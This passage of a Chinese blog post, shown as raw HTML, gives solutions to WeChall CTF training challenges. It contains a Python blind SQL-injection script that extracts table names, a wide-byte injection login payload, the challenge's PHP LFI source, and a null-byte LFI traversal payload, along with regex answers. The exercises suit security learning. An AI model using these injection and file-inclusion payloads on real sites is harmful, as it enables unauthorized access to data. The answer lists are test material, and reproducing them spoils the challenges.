= <span class="string">&quot;gizmore_tableu61&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(db_name)</span><br><span class="line">payload3 = <span class="string">&quot;ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	high = <span class="number">128</span></span><br><span class="line">	<span class="keyword">while</span> low &lt; high:</span><br><span class="line">		mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">		payload = payload3.<span class="built_in">format</span>(payload2, i, mid)</span><br><span class="line">		resp = requests.get(url.<span class="built_in">format</span>(payload))</span><br><span class="line">		<span class="comment"># print(j)</span></span><br><span class="line">		<span class="comment"># print(url.format(payload))</span></span><br><span class="line">		<span class="comment"># print( resp.text)</span></span><br><span class="line">		<span class="keyword">if</span> success <span class="keyword">in</span> resp.text:</span><br><span class="line">			low = mid + <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high = mid</span><br><span class="line">	<span class="keyword">if</span> low == <span class="number">32</span> <span class="keyword">or</span> high == <span class="number">128</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		tb_name += <span class="built_in">chr</span>(low)</span><br><span class="line">		print(tb_name)</span><br><span class="line">tb_name=<span class="string">&quot;aaawrong,usertableus4&quot;</span></span><br></pre></td></tr></table></figure>
<p>答案为（试出来的）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gizmore_tableu61_usertableus4</span><br></pre></td></tr></table></figure>
<h1 id="Addslashes"><a href="#Addslashes" class="headerlink" title="Addslashes"></a>Addslashes</h1><p>考察：宽字节注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username: 1 %Df%27 union select &#39;Admin&#39; from users#</span><br></pre></td></tr></table></figure>


<h1 id="Training-Regex-1"><a href="#Training-Regex-1" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><p>考察：正则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^wechall$&#x2F;</span><br></pre></td></tr></table></figure>
<h1 id="Training-PHP-LFI"><a href="#Training-PHP-LFI" class="headerlink" title="Training: PHP LFI"></a>Training: PHP LFI</h1><p>考察：%00截断</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># Higlighter Plain 如果有show变量，且show变量的值是source，就显示index.php的代码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>] === <span class="string">&#x27;source&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: text/plain; charset=utf8;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Change dir to web root 跳转到这个目录</span></span><br><span class="line">chdir(<span class="string">&#x27;../../../../../&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Print the website header</span></span><br><span class="line">define(<span class="string">&#x27;GWF_PAGE_TITLE&#x27;</span>, <span class="string">&#x27;Local File Inclusion&#x27;</span>);</span><br><span class="line"><span class="comment"># 与require作用相同，唯一区别是若该文件代码已被包含，则不会再次包含</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;challenge/html_head.php&#x27;</span>);</span><br><span class="line"><span class="comment"># ？</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === (<span class="variable">$chall</span> = WC_Challenge::getByTitle(<span class="string">&#x27;Training: PHP LFI&#x27;</span>))) &#123;</span><br><span class="line">        <span class="variable">$chall</span> = WC_Challenge::dummyChallenge(<span class="string">&#x27;Training: PHP LFI&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;challenge/training/php/lfi/up/index.php&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$chall</span>-&gt;showHeader();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Highlighter BBCode</span></span><br><span class="line"><span class="comment"># 从URL处判断是否是高亮显示代码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;highlight&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;highlight&#x27;</span>] === <span class="string">&#x27;christmas&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> GWF_Message::display(<span class="string">&#x27;[PHP]&#x27;</span>.file_get_contents(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]).<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="string">&#x27;challenge/html_foot.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line"><span class="comment">### Here is your exploit :) ###</span></span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line"><span class="comment"># 此处为关键语句，code为设置filename=pages/&#123;&#125;.html，如果有file变量，则填入file变量，否则填入welcom</span></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;$filename = \&#x27;pages/\&#x27;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).\&#x27;.html\&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$code_emulate_pnb</span> = <span class="string">&#x27;$filename = Common::substrUntil($filename, &quot;\\0&quot;);&#x27;</span>; <span class="comment"># Emulate Poison Null Byte for PHP&gt;=5.3.4</span></span><br><span class="line"><span class="comment"># 包含filename文件</span></span><br><span class="line"><span class="variable">$code2</span> = <span class="string">&#x27;include $filename;&#x27;</span>;</span><br><span class="line"><span class="comment">### End of exploit ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Show the mission box</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;index.php?file=&#x27;</span>;</span><br><span class="line"><span class="variable">$ex</span> = <span class="keyword">array</span>(<span class="string">&#x27;welcome&#x27;</span>, <span class="string">&#x27;news&#x27;</span>, <span class="string">&#x27;forums&#x27;</span>);</span><br><span class="line"><span class="variable">$showsrc1</span> = <span class="string">&#x27;index.php?show=source&#x27;</span>;</span><br><span class="line"><span class="variable">$showsrc2</span> = <span class="string">&#x27;index.php?highlight=christmas&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ex</span> <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$e</span>) &#123; <span class="variable">$ex</span>[<span class="variable">$i</span>] = htmlspecialchars(<span class="variable">$url</span>.<span class="variable">$e</span>); &#125;</span><br><span class="line"><span class="keyword">echo</span> GWF_Box::box(<span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;info&#x27;</span>, <span class="keyword">array</span>(GWF_Message::display(<span class="string">&#x27;[PHP]&#x27;</span>.<span class="variable">$code</span>.PHP_EOL.<span class="variable">$code2</span>.<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;../solution.php&#x27;</span>, <span class="variable">$showsrc1</span>, <span class="variable">$showsrc2</span>, <span class="variable">$ex</span>[<span class="number">0</span>], <span class="variable">$ex</span>[<span class="number">1</span>], <span class="variable">$ex</span>[<span class="number">2</span>])), <span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;title&#x27;</span>));</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Execute the code, using eval.</span></span><br><span class="line">GWF_Debug::setDieOnError(<span class="literal">false</span>);</span><br><span class="line">GWF_Debug::setMailOnError(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>.<span class="variable">$code_emulate_pnb</span>); <span class="comment"># eval the first line</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box&quot;&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box_t&quot;&gt;&#x27;</span>.<span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;example_title&#x27;</span>).<span class="string">&#x27; (&#x27;</span>.htmlspecialchars(<span class="variable">$filename</span>).<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box_c&quot;&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> (lfiIsSafeDir(<span class="variable">$filename</span>) === <span class="literal">true</span>) &#123; <span class="keyword">eval</span>(<span class="variable">$code2</span>); &#125; <span class="comment"># Eval the second line, when safe.</span></span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> GWF_HTML::error(<span class="string">&#x27;LFI&#x27;</span>, <span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;err_basedir&#x27;</span>), <span class="literal">false</span>); &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line">GWF_Debug::setMailOnError(<span class="literal">true</span>);</span><br><span class="line">GWF_Debug::setDieOnError(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Show credits box</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> !== (<span class="variable">$minus</span> = GWF_User::getByName(<span class="string">&#x27;minus&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> GWF_Box::box(<span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;credits&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$minus</span>-&gt;displayProfileLink())));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Show end of website</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$chall</span>-&gt;copyrightFooter();</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;challenge/html_foot.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">### Safety first ###</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lfiIsSafeDir</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$valid</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pages&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;pages/../..&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;pages/..&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$d</span> = dirname(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> in_array(<span class="variable">$d</span>, <span class="variable">$valid</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据代码中的关键代码段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 此处为关键语句，code为设置filename&#x3D;pages&#x2F;&#123;&#125;.html，如果有file变量，则填入file变量，否则填入welcom</span><br><span class="line">$code &#x3D; &#39;$filename &#x3D; \&#39;pages&#x2F;\&#39;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).\&#39;.html\&#39;;&#39;;</span><br><span class="line">$code_emulate_pnb &#x3D; &#39;$filename &#x3D; Common::substrUntil($filename, &quot;\\0&quot;);&#39;; # Emulate Poison Null Byte for PHP&gt;&#x3D;5.3.4</span><br><span class="line"># 包含filename文件</span><br><span class="line">$code2 &#x3D; &#39;include $filename;&#39;;</span><br></pre></td></tr></table></figure>
<p>提交URL（为什么两个父节点，因为试出来的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;solution.php%00 </span><br><span class="line"># %00用于截断</span><br></pre></td></tr></table></figure>
<h1 id="Training-Regex-2"><a href="#Training-Regex-2" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><p>考察：正则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^(wechall4?)\.(?:jpg|gif|tiff|bmp|png)$&#x2F;</span><br></pre></td></tr></table></figure>
<p>至于为什么用:，是因为题目提示了“你的模式会补货一个字符串，但这不是必须的。请使用非捕获组”</p>
<h2 id="正则的非获取匹配"><a href="#正则的非获取匹配" class="headerlink" title="正则的非获取匹配"></a>正则的非获取匹配</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?:pattern</span><br><span class="line">	匹配pattern但不获取匹配结果，不进行存储供使用</span><br></pre></td></tr></table></figure>
<p>参考 <a target="_blank" rel="noopener" href="http://qinxuye.me/article/non-capturing-pattern-in-regular-expression/">http://qinxuye.me/article/non-capturing-pattern-in-regular-expression/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(&quot;win (7|vista)&quot;, &quot;win 7&quot;).group()</span><br><span class="line">&#39;win 7&#39;</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; re.match(&quot;win (7|vista)&quot;, &quot;win 7&quot;).groups()</span><br><span class="line">(&#39;7&#39;,)</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; re.match(&quot;win (?:7|vista)&quot;, &quot;win 7&quot;).group()</span><br><span class="line">&#39;win 7&#39;</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; re.match(&quot;win (?:7|vista)&quot;, &quot;win 7&quot;).groups()</span><br><span class="line">()</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/" data-id="ckkdrz0z00003ugus79z2hkub" data-title="wechall答案" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AD%94%E6%A1%88/" rel="tag">答案</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          SQL注入WAF绕过姿势
        
      </div>
    </a>
  
  
    <a href="/2021/01/22/CTF-Web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">CTF-Web-文件包含</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/" rel="tag">攻防世界wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E8%AF%AD/" rel="tag">日语</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%94%E6%A1%88/" rel="tag">答案</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 10px;">摘抄</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/" style="font-size: 10px;">攻防世界wp</a> <a href="/tags/%E6%97%A5%E8%AF%AD/" style="font-size: 10px;">日语</a> <a href="/tags/%E7%AD%94%E6%A1%88/" style="font-size: 10px;">答案</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/02/15/%E8%80%83%E8%AF%81-%E6%97%A5%E8%AF%AD-%E5%88%9D%E7%BA%A7%E8%AF%BE%E6%96%87%E6%B1%89%E8%AF%91%E6%97%A5/">考证-日语-初级课文汉译日</a>
          </li>
        
          <li>
            <a href="/2021/02/12/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Creverse%E5%88%9D%E7%BA%A7/">CTF-wp-攻防世界reverse初级</a>
          </li>
        
          <li>
            <a href="/2021/02/08/CTF-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">CTF-Web-文件上传</a>
          </li>
        
          <li>
            <a href="/2021/02/06/CTF-Web-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF2-1/">CTF-Web-CTFer成长之路2.1</a>
          </li>
        
          <li>
            <a href="/2021/02/05/CTF-wp-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/">wp-CTFer成长之路-第一章</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>